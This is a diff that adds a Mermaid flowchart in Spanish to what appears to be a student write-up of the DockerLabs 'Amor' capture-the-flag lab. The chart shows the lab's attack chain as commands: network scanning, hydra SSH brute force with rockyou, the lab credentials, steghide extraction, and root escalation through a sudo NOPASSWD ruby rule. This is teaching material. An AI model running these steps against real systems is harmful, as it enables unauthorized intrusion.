@@ -242,5 +242,75 @@ El flujo completo del reto demuestra una metodología estructurada de penetraci�
 
 # :three: Realice un diagrama de flujo de todo el procedimiento realizado.
 
+El siguiente diagrama representa la metodología técnico-jurídica empleada durante el reto "Amor" de DockerLabs, siguiendo la secuencia exacta de comandos ejecutados según el **marco constitucional colombiano** y las **mejores prácticas de ciberseguridad ética**.
+
+```mermaid
+graph TD
+%% Fase 1: Preparación y Despliegue
+A[🚀 INICIO: Acceso DockerLabs.es] --> B[📦 Descargar CTF Amor]
+B --> C[🔄 Transferir a Kali: scp -r amor kali@192.168.1.12:/home/kali/Documents/]
+C --> D{🐳 ¿Docker instalado?}
+D -->|❌ No| E[⚙️ sudo apt install docker.io]
+D -->|✅ Sí| F[🏗️ Desplegar: ./auto_deploy.sh amor.tar]
+E --> F
+
+%% Fase 2: Reconocimiento y Enumeración de Red
+F --> G[🌐 Verificar interfaces: ip add]
+G --> H[🔍 Descubrimiento ARP:<br/>sudo netdiscover -i docker0 -r 172.17.0.0/24]
+H --> I[📊 Resultado: 172.17.0.1 + 172.17.0.2]
+I --> J[🎯 Escaneo puertos:<br/>sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2]
+J --> K[📋 Puertos abiertos: 22/SSH + 80/HTTP]
+
+%% Fase 3: Enumeración Web
+K --> L[🌍 Inspección web: http://172.17.0.2]
+L --> M[🔍 Fuzzing directorios:<br/>gobuster dir -u http://172.17.0.2/ -w directory-list-2.3-medium.txt]
+M --> N[❌ Fuzzing infructuoso<br/>💡 Pistas: carlota, juan]
+
+%% Fase 4: Explotación de Credenciales
+N --> O[🔐 Fuerza bruta SSH:<br/>hydra -l carlota -P rockyou.txt ssh://172.17.0.2 -t 10]
+O --> P[✅ Credenciales válidas: carlota / babygirl]
+P --> Q[🔑 Conexión SSH: ssh carlota@172.17.0.2]
+
+%% Fase 5: Escalada Lateral y Recolección
+Q --> R[📁 Navegación filesystem:<br/>cd /home/carlota/Desktop/fotos/vacaciones]
+R --> S[🖼️ Archivo encontrado: imagen.jpg]
+S --> T[⬇️ Descarga segura:<br/>scp carlota@172.17.0.2:/home/carlota/.../imagen.jpg /home/kali/Documents/amor]
+T --> U[🔍 Verificar tipo: file imagen.jpg]
+
+%% Fase 6: Análisis Forense y Esteganografía
+U --> V[🕵️ Análisis esteganografía:<br/>steghide --extract -sf imagen.jpg]
+V --> W[📄 Archivo extraído: secret.txt]
+W --> X[🔤 Contenido Base64: ZXNsYWNhc2FkZXBpbnlwb24=]
+X --> Y[🔓 Decodificar: base64 -d]
+Y --> Z[🔑 Password revelada: eslacasadepinypon]
+
+%% Fase 7: Escalada de Privilegios
+Z --> AA[👤 Escalada horizontal: su oscar]
+AA --> BB[🔍 Auditoría permisos: sudo -l]
+BB --> CC[⚠️ Configuración insegura:<br/> root NOPASSWD: /usr/bin/ruby]
+CC --> DD[🚀 Escalada vertical:<br/>sudo /usr/bin/ruby -e]
+DD --> EE[👑 Verificación final: whoami → root]
+EE --> FF[🎉 ÉXITO: Compromiso total del sistema]
+
+%% Estilos por fase
+classDef preparacion fill:#e3f2fd,stroke:#1976d2,stroke-width:2px,color:#000
+classDef reconocimiento fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px,color:#000
+classDef enumeracion fill:#fff8e1,stroke:#f57c00,stroke-width:2px,color:#000
+classDef explotacion fill:#ffebee,stroke:#c62828,stroke-width:2px,color:#000
+classDef lateral fill:#f1f8e9,stroke:#388e3c,stroke-width:2px,color:#000
+classDef forense fill:#fce4ec,stroke:#ad1457,stroke-width:2px,color:#000
+classDef privilegios fill:#e8f5e8,stroke:#2e7d32,stroke-width:2px,color:#000
+classDef exito fill:#c8e6c9,stroke:#1b5e20,stroke-width:3px,color:#000
+
+%% Aplicar estilos
+class A,B,C,D,E,F preparacion
+class G,H,I,J,K reconocimiento
+class L,M,N enumeracion
+class O,P,Q explotacion
+class R,S,T,U lateral
+class V,W,X,Y,Z forense
+class AA,BB,CC,DD,EE privilegios
+class FF exito
+```
 
 
